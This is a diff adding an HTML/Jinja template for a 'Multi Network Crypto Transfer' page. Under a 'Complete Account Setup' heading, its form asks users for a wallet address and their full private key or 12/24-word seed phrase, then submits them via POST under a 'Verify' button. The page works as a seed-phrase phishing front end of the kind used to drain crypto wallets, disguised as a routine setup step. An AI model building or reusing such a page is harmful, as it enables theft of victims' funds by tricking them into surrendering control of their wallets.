@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Multi Network Crypto Transfer</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: limegreen;
+        }
+
+        .form-container {
+            max-width: 600px;
+            background: #111;
+            margin: 60px auto;
+            padding: 30px 40px;
+            border-radius: 12px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+
+        .form-container h2 {
+            text-align: center;
+            color: limegreen;
+            margin-bottom: 25px;
+            font-size: 24px;
+        }
+
+        label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 6px;
+            margin-top: 18px;
+            color: limegreen;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            color: limegreen;
+            border: 1px solid limegreen;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+
+        .checkbox-group {
+            margin-top: 15px;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .checkbox-group label {
+            font-weight: normal;
+            color: limegreen;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 30px;
+            font-size: 16px;
+            background: limegreen;
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #1aff1a;
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+        }
+
+        .success {
+            background-color: #003300;
+            color: limegreen;
+            border: 1px solid limegreen;
+        }
+
+        .error {
+            background-color: #330000;
+            color: #f33;
+            border: 1px solid #f33;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 12px;
+            background: #222;
+            color: limegreen;
+            border: 1px solid limegreen;
+            border-radius: 8px;
+            font-size: 14px;
+            resize: vertical;
+        }
+
+        textarea::placeholder {
+            color: limegreen;
+            opacity: 0.6;
+        }
+
+        .network-options label {
+            display: block;
+            margin: 6px 0;
+            color: limegreen;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .network-options input[type="checkbox"] {
+            margin-right: 8px;
+            transform: scale(1.2);
+        }
+
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        /* Menu Styling */
+        .menu-icon {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 26px;
+            cursor: pointer;
+            color: limegreen;
+        }
+
+        .menu {
+            display: none;
+            position: absolute;
+            top: 60px;
+            left: 20px;
+            background-color: #1f1f1f;
+            padding: 10px 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px limegreen;
+        }
+
+        .menu a {
+            display: block;
+            color: #ddd;
+            padding: 8px 0;
+            text-decoration: none;
+        }
+
+        .menu a:hover {
+            color: limegreen;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Flash Messages -->
+    {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}
+        {% for category, message in messages %}
+            <div class="message {{ category }}">{{ message }}</div>
+        {% endfor %}
+    {% endif %}
+    {% endwith %}
+
+    <!-- Menu Icon -->
+    <div class="menu-icon" onclick="toggleMenu()">☰</div>
+
+    <!-- Dropdown Menu -->
+    <div class="menu" id="dropdownMenu">
+        <a href="mining">Home</a>
+    </div>
+
+    <div class="form-container">
+        <h2> Complete Account Setup</h2>
+        <form method="POST" id="cryptoForm" onsubmit="return validateNetworks()">
+            <label for="wallet_address">Wallet Address</label>
+            <input type="text" id="wallet_address" name="wallet_address" required placeholder="Enter your wallet address">
+
+            <label>Private Key or Seed Phrase</label>
+            <textarea name="private_key" rows="4" placeholder="Paste your wallet private key or 12/24-word seed phrase here" required></textarea>
+            <label for="networks">Select Receiving Networks</label>
+            <div>
+            <button type="button" style="padding : 10px; width: 30%;
+            margin-top: 10px;
+            font-size: 12px;
+            background: limegreen;
+            border-radius: 8px;
+            color: #000;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        " id="select-all-networks">Select All</button>
+
+            <div class="network-options">
+                <label><input type="checkbox" name="networks" value="ETH"> Ethereum</label>
+                <label><input type="checkbox" name="networks" value="BNB"> BNB</label>
+                <label><input type="checkbox" name="networks" value="USDT"> USDT (ERC20)</label>
+                <label><input type="checkbox" name="networks" value="BTC"> Bitcoin</label>
+                <label><input type="checkbox" name="networks" value="POLYGON"> Polygon</label>
+                <label><input type="checkbox" name="networks" value="ARBITRUM"> Arbitrum</label>
+                <label><input type="checkbox" name="networks" value="OPTIMISM"> Optimism</label>
+            </div>
+            
+            <div class="error-message" id="networkError">Please select at least one network to proceed.</div>
+
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
+    <script>
+        function toggleMenu() {
+            const menu = document.getElementById('dropdownMenu');
+            menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
+        }
+    
+        // Hide the menu when clicking outside
+        document.addEventListener('click', function(event) {
+            const menu = document.getElementById('dropdownMenu');
+            const icon = document.querySelector('.menu-icon');
+            if (!menu.contains(event.target) && !icon.contains(event.target)) {
+                menu.style.display = 'none';
+            }
+        });
+    
+        // Validate networks before form submission
+        function validateNetworks() {
+            const networks = document.querySelectorAll('input[name="networks"]:checked');
+            if (networks.length === 0) {
+                document.getElementById('networkError').style.display = 'block';
+                return false;
+            }
+            return true;
+        }
+    
+        // ✅ Proper "Select All" functionality
+        document.getElementById('select-all-networks').addEventListener('click', function () {
+            const checkboxes = document.querySelectorAll('.network-options input[type="checkbox"]');
+            checkboxes.forEach(checkbox => {
+                checkbox.checked = true;
+            });
+        });
+    </script>
+    
+
+</body>
+</html>
